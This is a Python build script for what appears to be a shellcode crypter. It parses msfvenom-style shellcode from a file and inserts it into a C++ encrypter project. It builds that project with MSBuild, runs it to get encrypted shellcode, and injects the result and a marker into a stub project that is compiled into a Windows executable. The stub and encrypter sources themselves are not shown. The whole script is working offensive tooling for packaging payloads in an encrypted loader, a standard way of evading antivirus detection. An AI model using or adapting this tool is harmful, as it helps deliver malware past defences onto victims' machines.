#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
from subprocess import call
import subprocess
import fileinput
import sys
import shutil

if len(sys.argv) < 2:
    print("[!] Missing first parameter: file-path of the shellcode-file")
    exit(1)

# set paths
shellcode_file_path = sys.argv[1]
MSBuilld_exe_path = os.path.join(
    "C:" + os.sep, "Program Files", "MSBuild", "12.0", "Bin", "MSBuild.exe")
project_root_path = os.path.dirname(os.path.realpath(__file__))

stub_sln_path = os.path.join(project_root_path, "stub", "stub.sln")
stub_cpp_path = os.path.join(os.path.dirname(
    os.path.realpath(stub_sln_path)), "stub", "stub.cpp")
stub_cpp_bak_path = os.path.join(os.path.dirname(
    os.path.realpath(stub_sln_path)), "stub", "stub.cpp.bak")
stub_debug_build_path = os.path.join(
    project_root_path, "stub", "Debug", "stub.exe")

encryptShellcode_sln_path = os.path.join(
    project_root_path, "encryptShellcode", "encryptShellcode.sln")
encryptShellcode_cpp_path = os.path.join(os.path.dirname(os.path.realpath(
    encryptShellcode_sln_path)), "encryptShellcode", "encryptShellcode.cpp")
encryptShellcode_cpp_bak_path = os.path.join(os.path.dirname(os.path.realpath(
    encryptShellcode_sln_path)), "encryptShellcode", "encryptShellcode.cpp.bak")
encryptShellcode_debug_build_path = os.path.join(
    project_root_path, "encryptShellcode", "Debug", "encryptShellcode.exe")

# check if all files are present
print("[?] Checking if all required files are present...")
for file in [shellcode_file_path, MSBuilld_exe_path, stub_cpp_path, stub_sln_path, encryptShellcode_cpp_path, encryptShellcode_sln_path]:
    if not os.path.isfile(file):
        print("\n[!] The file " + file + " is missing :(")
        exit(1)
print("[:)] All files are present")
print("[+] Using " + shellcode_file_path + " as shellcode-source")

# read the shellcode from file because importing doesnt work
print("[*] Reading shellcode from file")
with open(shellcode_file_path, 'r') as shellcode_file:
    shellcode = shellcode_file.read().replace('buf =  ""', '').replace(
        'buf += ', '').replace('\n', '').replace('\r', '').replace('"', '')

# if there is an error -> recover the src-files
try:

    print("[*] Inserting shellcode into encrypter")
    # insert the shellcode into the cpp-src
    # adapted from http://stackoverflow.com/questions/17140886/how-to-search-and-replace-text-in-a-file-using-python
    with fileinput.FileInput(encryptShellcode_cpp_path, inplace=True) as encryptShellcode_cpp_file:
        for line in encryptShellcode_cpp_file:
            print(line.replace("PUTYOURSHELLCODEHERE!!1!", shellcode), end='')

    print("[*] Building encryptShellcode")
    # build encryptShellcode
    call([MSBuilld_exe_path, encryptShellcode_sln_path])
    # execute the encrypter and get the printed string
    proc = subprocess.Popen(
        [encryptShellcode_debug_build_path], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    # the splitted output without the last 5 chars (junk)
    cipher_shellcode = str(out).split("ciphertext: ")[1][:-5]

    print("[*] Inserting encrypted shellcode and marker into stub")
    # insert the marker and encrypted shellcode into the stub

    # insert encryped shellcode
    with fileinput.FileInput(stub_cpp_path, inplace=True) as stub_cpp_file:
        for line in stub_cpp_file:
            print(line.replace("PUTYOURCIPHERHERE!!1!", cipher_shellcode), end='')

    # create marker - first few chars
    marker = shellcode[:52]
    # insert marker
    with fileinput.FileInput(stub_cpp_path, inplace=True) as stub_cpp_file:
        for line in stub_cpp_file:
            print(line.replace("PUTYOURMARKERHERE!!1!", marker), end='')

    # build the stub
    print("[*] Building the stub")
    call([MSBuilld_exe_path, stub_sln_path])

    print("[+] Stub-Generation finished")
    print("[+] Cleaning files...")

except Exception as e:
    print("[:(] Error, recovering src-files...")

    os.remove(stub_cpp_path)
    shutil.copyfile(stub_cpp_bak_path, stub_cpp_path)

    os.remove(encryptShellcode_cpp_path)
    shutil.copyfile(encryptShellcode_cpp_bak_path, encryptShellcode_cpp_path)

    print(str(e))
    sys.exit()

# reset the placeholders
with fileinput.FileInput(encryptShellcode_cpp_path, inplace=True) as encryptShellcode_cpp_file:
    for line in encryptShellcode_cpp_file:
        print(line.replace(shellcode, "PUTYOURSHELLCODEHERE!!1!"), end='')

with fileinput.FileInput(stub_cpp_path, inplace=True) as stub_cpp_file:
    for line in stub_cpp_file:
        print(line.replace(cipher_shellcode, "PUTYOURCIPHERHERE!!1!"), end='')

with fileinput.FileInput(stub_cpp_path, inplace=True) as stub_cpp_file:
    for line in stub_cpp_file:
        print(line.replace(marker, "PUTYOURMARKERHERE!!1!"), end='')

print("[+] Done")
print("[+] The generated .exe is in: " + stub_debug_build_path)
